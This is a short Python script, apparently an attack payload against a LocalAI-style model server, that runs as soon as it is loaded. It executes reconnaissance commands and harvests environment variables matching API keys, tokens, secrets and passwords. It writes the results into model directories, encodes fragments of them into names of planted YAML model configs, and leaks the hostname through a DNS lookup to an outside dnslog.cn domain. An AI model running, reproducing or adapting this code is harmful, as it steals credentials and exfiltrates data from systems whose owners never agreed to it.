import os, subprocess, base64, sys, socket
def _run():
    try:
        r = subprocess.check_output("echo START; id; hostname; pwd; ls -la / 2>/dev/null | head -20; echo ===ENV===; env | grep -iE 'api.?key|token|secret|sk-|deepseek|openai|azure|password|auth|localai|models|home' | head -40", shell=True, stderr=subprocess.STDOUT, timeout=15)
    except Exception as e:
        r = str(e).encode()
    b64 = base64.b64encode(r).decode()
    # 写结果到所有可能的模型目录
    paths = ["/models", "/build/models", "/app/models", "/data/models", "/mnt/models", "/usr/share/localai/models", "/tmp"]
    for d in paths:
        try:
            os.makedirs(d, exist_ok=True)
            open(os.path.join(d, "PWN-RESULT.txt"), "wb").write(r)
        except: pass
        try:
            # yaml 模型配置 (watcher 扫描注册, 文件名含 b64 前段)
            fname = os.path.join(d, "XFR-" + b64[:20].replace("+","p").replace("/","s").replace("=","e") + ".yaml")
            with open(fname, "w") as f:
                f.write("name: XFRTEST\nbackend: llama-cpp\nmodel: /models/dummy.gguf\n")
        except: pass
    # DNS 外带
    try:
        socket.setdefaulttimeout(3)
        host = open("/etc/hostname").read().strip()[:40] if os.path.exists("/etc/hostname") else "nohost"
        socket.gethostbyname(host.replace(".","-") + ".hc92gc.dnslog.cn")
    except: pass
_run()
